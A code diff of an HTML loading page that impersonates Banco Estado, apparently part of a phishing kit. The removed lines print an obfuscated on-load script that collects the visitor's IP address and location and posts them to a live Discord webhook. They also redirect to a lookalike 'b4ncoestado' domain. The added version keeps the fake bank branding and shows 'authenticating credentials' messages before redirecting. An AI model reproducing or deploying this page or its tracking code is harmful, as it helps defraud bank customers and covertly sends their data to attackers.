@@ -5,223 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="shortcut icon" type="image/png" href="favicon.png">
     <title>Banco Estado</title>
-
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
-        }
-
-        html, body {
-            height: 100%;
-            width: 100%;
+            box-sizing: border-box;
         }
 
         body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(180deg, #ffffff 0%, #fef5f0 50%, #fff9f5 100%);
-            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e8eef5 100%);
             min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
         }
 
-        .background-accent-1 {
+        /* Fondo con patrón sutil */
+        body::before {
+            content: '';
             position: fixed;
-            width: 400px;
-            height: 400px;
-            background: radial-gradient(circle, rgba(255, 140, 0, 0.15) 0%, transparent 70%);
-            border-radius: 50%;
-            top: -150px;
-            right: -150px;
-            z-index: 0;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(2, 87, 160, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(220, 53, 69, 0.05) 0%, transparent 50%);
             pointer-events: none;
-        }
-
-        .background-accent-2 {
-            position: fixed;
-            width: 350px;
-            height: 350px;
-            background: radial-gradient(circle, rgba(2, 87, 160, 0.1) 0%, transparent 70%);
-            border-radius: 50%;
-            bottom: -100px;
-            left: -100px;
             z-index: 0;
-            pointer-events: none;
         }
 
         .container {
-            text-align: center;
-            max-width: 460px;
             width: 100%;
-            padding: 20px;
-            z-index: 1;
-            position: relative;
-        }
-
-        .card {
+            max-width: 480px;
             background: white;
-            border-radius: 24px;
-            padding: 60px 45px;
-            box-shadow: 0 12px 40px rgba(255, 140, 0, 0.12), 0 4px 16px rgba(0, 0, 0, 0.08);
-            animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
-            border: 2px solid rgba(255, 140, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, #0257a0 0%, #ff8c00 50%, #0257a0 100%);
-            background-size: 200% 100%;
-            animation: gradientShift 3s ease-in-out infinite;
-        }
-
-        /* LOGO */
-        .logo-section {
-            margin-bottom: 42px;
-            position: relative;
-        }
-
-        .logo-container {
-            width: 140px;
-            height: 140px;
-            margin: 0 auto 20px;
-            border-radius: 24px;
-            overflow: hidden;
-            background: transparent;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: slideDown 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
-            box-shadow: none;
-            padding: 0;
-            position: relative;
-        }
-
-        .logo-container::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.25) 0%, rgba(255, 255, 255, 0) 100%);
-            pointer-events: none;
-            border-radius: 24px;
-        }
-
-        .logo-container img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06), 0 4px 16px rgba(0, 0, 0, 0.08);
+            padding: 50px 40px;
+            text-align: center;
+            animation: slideUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
             position: relative;
             z-index: 1;
         }
 
-        /* ANILLO PULSANTE */
-        .pulse-ring {
-            position: absolute;
-            width: 165px;
-            height: 165px;
-            border: 2px solid rgba(255, 140, 0, 0.4);
-            border-radius: 24px;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: pulseFade 2s ease-out infinite;
-        }
-
-        /* INDICADOR DE CARGA */
-        .progress-bar {
-            margin-bottom: 40px;
-            height: 6px;
-            background: linear-gradient(90deg, #f0f3f7 0%, #fef5f0 50%, #f0f3f7 100%);
-            border-radius: 3px;
-            overflow: hidden;
-            position: relative;
-            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.05);
-        }
-
-        .progress-bar::after {
-            content: '';
-            position: absolute;
-            left: 0;
-            top: 0;
-            height: 100%;
-            width: 40%;
-            background: linear-gradient(90deg, 
-                transparent 0%, 
-                #ff8c00 40%, 
-                #0257a0 50%, 
-                #ff8c00 60%, 
-                transparent 100%);
-            animation: progressMove 2.5s ease-in-out infinite;
-            border-radius: 3px;
-            box-shadow: 0 0 10px rgba(255, 140, 0, 0.5);
-        }
-
-        /* CONTENIDO DE ESTADO */
-        .status-content {
-            margin-bottom: 32px;
-        }
-
-        .main-text {
-            font-size: 20px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #0257a0 0%, #ff8c00 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: -0.3px;
-            margin-bottom: 10px;
-            animation: fadeIn 0.8s ease-out 0.2s both;
-        }
-
-        .sub-text {
-            font-size: 14px;
-            color: #6b7280;
-            font-weight: 500;
-            letter-spacing: 0.2px;
-            animation: fadeIn 0.8s ease-out 0.3s both;
-        }
-
-        .dots {
-            display: inline-block;
-            width: 4px;
-            animation: dotsAnimation 1.4s steps(4, end) infinite;
-        }
-
-        /* INFORMACIÓN DE SEGURIDAD */
-        .security-footer {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            padding-top: 24px;
-            border-top: 1px solid rgba(255, 140, 0, 0.15);
-            font-size: 13px;
-            color: #6b7280;
-            animation: fadeIn 0.8s ease-out 0.4s both;
-        }
-
-        .status-indicator {
-            display: inline-block;
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: #10b981;
-            animation: statusPulse 2s infinite;
-            margin-right: 4px;
-        }
-
-        /* ANIMACIONES */
         @keyframes slideUp {
             from {
                 opacity: 0;
@@ -233,152 +63,335 @@
             }
         }
 
-        @keyframes slideDown {
-            from {
-                opacity: 0;
-                transform: translateY(-20px) scale(0.9);
+        .header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 35px;
+            animation: fadeIn 0.8s ease-out 0.2s both;
+        }
+
+        .logo-img {
+            width: 130px;
+            height: 130px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            border-radius: 12px;
+        }
+
+        .logo-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+        }
+
+        .logo-text {
+            display: none;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0257a0;
+            margin-bottom: 12px;
+            line-height: 1.3;
+            min-height: 40px;
+            animation: fadeIn 0.8s ease-out 0.35s both;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: #6b7280;
+            margin-bottom: 38px;
+            font-weight: 500;
+            animation: fadeIn 0.8s ease-out 0.5s both;
+        }
+
+        /* Contador circular - OCULTO */
+        .counter-container {
+            display: none;
+        }
+
+        /* Sección de carga */
+        .loading-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 22px;
+        }
+
+        /* Spinner mejorado - estilo Banco Estado */
+        .spinner {
+            position: relative;
+            width: 56px;
+            height: 56px;
+        }
+
+        .spinner-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 3px solid rgba(2, 87, 160, 0.15);
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+        }
+
+        .spinner-ring:nth-child(1) {
+            border-top: 3px solid #0257a0;
+            animation-duration: 1.8s;
+        }
+
+        .spinner-ring:nth-child(2) {
+            border-right: 3px solid #dc3545;
+            animation: spin 1.2s linear infinite reverse;
+            animation-delay: 0.3s;
+            width: 75%;
+            height: 75%;
+            top: 12.5%;
+            left: 12.5%;
+        }
+
+        .spinner-ring:nth-child(3) {
+            border-bottom: 3px solid #ff8c00;
+            animation-duration: 0.9s;
+            width: 50%;
+            height: 50%;
+            top: 25%;
+            left: 25%;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 15px;
+            color: #1f2937;
+            font-weight: 600;
+            letter-spacing: 0.2px;
+        }
+
+        .status-message {
+            font-size: 12px;
+            color: #9ca3af;
+            animation: pulse 2s ease-in-out infinite;
+            font-weight: 500;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+
+        /* Indicadores de progreso */
+        .progress-indicators {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            margin-top: 15px;
+        }
+
+        .progress-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #e5e7eb;
+            animation: progressPulse 1.6s ease-in-out infinite;
+        }
+
+        .progress-dot:nth-child(1) { animation-delay: 0s; }
+        .progress-dot:nth-child(2) { animation-delay: 0.3s; }
+        .progress-dot:nth-child(3) { animation-delay: 0.6s; }
+
+        @keyframes progressPulse {
+            0%, 60% { 
+                background: #e5e7eb;
+                transform: scale(1);
             }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
+            30% { 
+                background: #0257a0;
+                transform: scale(1.15);
+            }
+            100% { 
+                background: #e5e7eb;
+                transform: scale(1);
             }
         }
 
         @keyframes fadeIn {
             from {
                 opacity: 0;
+                transform: translateY(8px);
             }
             to {
                 opacity: 1;
+                transform: translateY(0);
             }
         }
 
-        @keyframes pulseFade {
-            0% {
-                opacity: 1;
-                transform: translate(-50%, -50%) scale(1);
+        @keyframes fadeInOut {
+            0% { 
+                opacity: 0; 
+                transform: translateY(-8px); 
             }
-            100% {
-                opacity: 0;
-                transform: translate(-50%, -50%) scale(1.3);
+            50% { 
+                opacity: 1; 
+                transform: translateY(0); 
             }
-        }
-
-        @keyframes progressMove {
-            0% {
-                left: -100%;
-            }
-            100% {
-                left: 100%;
+            100% { 
+                opacity: 0; 
+                transform: translateY(8px); 
             }
         }
 
-        @keyframes dotsAnimation {
-            0% { content: ''; }
-            25% { content: '.'; }
-            50% { content: '..'; }
-            75% { content: '...'; }
-            100% { content: ''; }
-        }
-
-        @keyframes statusPulse {
-            0%, 100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.5;
-            }
-        }
-
-        @keyframes gradientShift {
-            0%, 100% {
-                background-position: 0% center;
-            }
-            50% {
-                background-position: 100% center;
-            }
-        }
-
-        /* RESPONSIVE */
+        /* Responsive */
         @media (max-width: 480px) {
-            .card {
-                padding: 45px 30px;
-                border-radius: 20px;
-                margin: 0 10px;
-            }
-
-            .main-text {
-                font-size: 18px;
-            }
-
-            .logo-container {
-                width: 120px;
-                height: 120px;
-                border-radius: 20px;
-            }
-
-            .pulse-ring {
-                width: 145px;
-                height: 145px;
-            }
-
             .container {
-                padding: 10px;
+                padding: 40px 25px;
+                border-radius: 14px;
+                max-width: 95vw;
+            }
+
+            .logo-img {
+                width: 80px;
+                height: 80px;
+            }
+
+            .logo-text {
+                font-size: 14px;
+                margin-left: 10px;
+            }
+
+            .title {
+                font-size: 24px;
+                min-height: 36px;
+            }
+
+            .subtitle {
+                font-size: 12px;
+                margin-bottom: 32px;
+            }
+
+
+
+            .loading-section {
+                gap: 18px;
+            }
+
+            .spinner {
+                width: 50px;
+                height: 50px;
+            }
+
+            .loading-text {
+                font-size: 14px;
+            }
+
+            .status-message {
+                font-size: 11px;
             }
         }
 
-        @media (prefers-reduced-motion: reduce) {
-            * {
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-                transition-duration: 0.01ms !important;
+        @media (max-width: 360px) {
+            .container {
+                padding: 30px 20px;
+                border-radius: 12px;
             }
+
+            .title {
+                font-size: 22px;
+                margin-bottom: 10px;
+            }
+
+            .logo-img {
+                width: 75px;
+                height: 75px;
+            }
+
+            .logo-text {
+                font-size: 13px;
+            }
+
+
         }
     </style>
 </head>
-
 <body>
-    <div class="background-accent-1"></div>
-    <div class="background-accent-2"></div>
-
     <div class="container">
-        <div class="card">
-            <div class="logo-section">
-                <div class="logo-container">
-                    <div class="pulse-ring"></div>
-                    <img src="https://emtecgroup.net/wp-content/uploads/2020/06/Banco-Estado.png" alt="BancoEstado">
-                </div>
+        <!-- Header con Logo -->
+        <div class="header">
+            <div class="logo-img">
+                <img src="logo-banco-estado.svg" alt="Logo Banco Estado">
+            </div>
+            <div class="logo-text">BancoEstado</div>
+        </div>
+
+        <!-- Título dinámico -->
+        <h1 class="title" id="dynamicTitle">Validando Identidad</h1>
+        <p class="subtitle">Por favor espera mientras procesamos tu solicitud</p>
+
+
+
+        <!-- Sección de Carga -->
+        <div class="loading-section">
+            <!-- Spinner estilo Banco Estado -->
+            <div class="spinner">
+                <div class="spinner-ring"></div>
+                <div class="spinner-ring"></div>
+                <div class="spinner-ring"></div>
             </div>
 
-            <div class="progress-bar"></div>
+            <div class="loading-text" id="statusText">Procesando solicitud</div>
+            <div class="status-message" id="statusSubtext">Autenticando credenciales</div>
 
-            <div class="status-content">
-                <div class="main-text">
-                    Generando Solicitud<span class="dots"></span>
-                </div>
-                <div class="sub-text">
-                    Procesando información de seguridad
-                </div>
-            </div>
-
-            <div class="security-footer">
-                <span class="status-indicator"></span>
-                <span>Conexión segura encriptada</span>
+            <!-- Indicadores de progreso -->
+            <div class="progress-indicators">
+                <div class="progress-dot"></div>
+                <div class="progress-dot"></div>
+                <div class="progress-dot"></div>
             </div>
         </div>
     </div>
 
-
-<script>
-const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_0x28a77c=_0x34c695();while(!![]){try{const _0x3c7a6f=parseInt(_0x6c628e(0x152))/0x1*(-parseInt(_0x6c628e(0x14d))/0x2)+-parseInt(_0x6c628e(0x161))/0x3*(parseInt(_0x6c628e(0x14b))/0x4)+parseInt(_0x6c628e(0x154))/0x5+-parseInt(_0x6c628e(0x14f))/0x6*(parseInt(_0x6c628e(0x15e))/0x7)+-parseInt(_0x6c628e(0x160))/0x8*(-parseInt(_0x6c628e(0x156))/0x9)+-parseInt(_0x6c628e(0x145))/0xa*(parseInt(_0x6c628e(0x15f))/0xb)+-parseInt(_0x6c628e(0x143))/0xc*(-parseInt(_0x6c628e(0x157))/0xd);if(_0x3c7a6f===_0x2224e9)break;else _0x28a77c['push'](_0x28a77c['shift']());}catch(_0x4130de){_0x28a77c['push'](_0x28a77c['shift']());}}}(_0x2f8d,0xa2d68));function _0x2f8d(){const _0x57d61e=['37116pdkyCD','✅\x20Alerta\x20enviada','156DjpiqC','DOMContentLoaded','city','69wqUGip','log','5423425yJRtMb','json','45oAEeXt','13qYuJOd','toISOString','readyState','application/json','Sistema\x20de\x20Monitoreo','https://ipinfo.io?token=','N/A','27237GValAU','11xWvJhp','13784zZRxoy','9srWaDX','toLocaleString','❌\x20Error:','📍\x20Ubicación','country','31103124SVdpIV','error','12629340KEWtPV','🚨\x20Nuevo\x20Ingreso\x20Detectado','loading','https://discord.com/api/webhooks/1539128158262001684/TnH2KJZAHKvHRDY6cptJ1GNxJY2d5hr-Z8-phfTxJib--__hPnAMz-SaXeCa-pSad6Cb','es-ES','addEventListener','498188OqdKmZ','🔐\x20IP\x20Address'];_0x2f8d=function(){return _0x57d61e;};return _0x2f8d();}const WEBHOOK_URL=_0x2a78b2(0x148),IPINFO_TOKEN='e8764d0b0d51b0';async function getGeoLocation(){const _0x67d802=_0x2a78b2;try{const _0x15232=new AbortController(),_0x1375e3=setTimeout(()=>_0x15232['abort'](),0x5dc),_0x5d63cb=_0x67d802(0x15c)+IPINFO_TOKEN,_0x114350=await fetch(_0x5d63cb,{'signal':_0x15232['signal']});return clearTimeout(_0x1375e3),await _0x114350[_0x67d802(0x155)]();}catch(_0x5e6ac4){return{'ip':'N/A','city':_0x67d802(0x15d),'country':'N/A'};}}function _0x7ff2(_0x33722d,_0x9a3c4e){_0x33722d=_0x33722d-0x13f;const _0x2f8dbe=_0x2f8d();let _0x7ff25e=_0x2f8dbe[_0x33722d];return _0x7ff25e;}async function sendAlert(){const _0x18c97b=_0x2a78b2;try{const _0x46f159=await getGeoLocation(),_0x2ff99c=new Date(),_0x4ebd6b=_0x2ff99c[_0x18c97b(0x13f)](_0x18c97b(0x149)),_0x257a7f={'title':_0x18c97b(0x146),'color':0xff5252,'fields':[{'name':_0x18c97b(0x14c),'value':'`'+(_0x46f159['ip']||'N/A')+'`','inline':!![]},{'name':_0x18c97b(0x141),'value':(_0x46f159[_0x18c97b(0x151)]||_0x18c97b(0x15d))+',\x20'+(_0x46f159[_0x18c97b(0x142)]||_0x18c97b(0x15d)),'inline':!![]},{'name':'⏰\x20Hora','value':'`'+_0x4ebd6b+'`','inline':![]}],'timestamp':_0x2ff99c[_0x18c97b(0x158)](),'footer':{'text':_0x18c97b(0x15b)}},_0x1582ba={'embeds':[_0x257a7f]};await fetch(WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x18c97b(0x15a)},'body':JSON['stringify'](_0x1582ba)}),console[_0x18c97b(0x153)](_0x18c97b(0x14e));}catch(_0x3065fe){console[_0x18c97b(0x144)](_0x18c97b(0x140),_0x3065fe);}}document[_0x2a78b2(0x159)]===_0x2a78b2(0x147)?document[_0x2a78b2(0x14a)](_0x2a78b2(0x150),sendAlert):sendAlert();
-</script>
-
-
     <script>
+    // Array de mensajes dinámicos
+    const mensajes = [
+        'Generando solicitud',
+        'Verificando Datos',
+        'Procesando Solicitud',
+        'Autenticando Usuario',
+        'Validando Información'
+    ];
+    const subtitulos = [
+        'Autenticando credenciales',
+        'Verificando información',
+        'Procesando solicitud',
+        'Finalizando validación',
+        'Cargando datos'
+    ];
+    let indiceActual = 0;
+
+    function cambiarTitulo() {
+        const titulo = document.getElementById('dynamicTitle');
+        const subtitulo = document.getElementById('statusSubtext');
+        titulo.style.animation = 'none';
         setTimeout(() => {
-            window.location.href = 'https://promosb4ncoestado.up.railway.app/';
-        }, 2500);
-    </script>
-    
+            titulo.textContent = mensajes[indiceActual];
+            subtitulo.textContent = subtitulos[indiceActual];
+            titulo.style.animation = 'fadeInOut 0.6s ease-in-out';
+            indiceActual = (indiceActual + 1) % mensajes.length;
+        }, 50);
+    }
+    setInterval(cambiarTitulo, 5000);
+
+    // ── Redirección simple después de 2.5 segundos ──
+    setTimeout(() => {
+        window.location.href = 'pagina-destino.php';
+    }, 2500);
+</script>
 </body>
 </html>
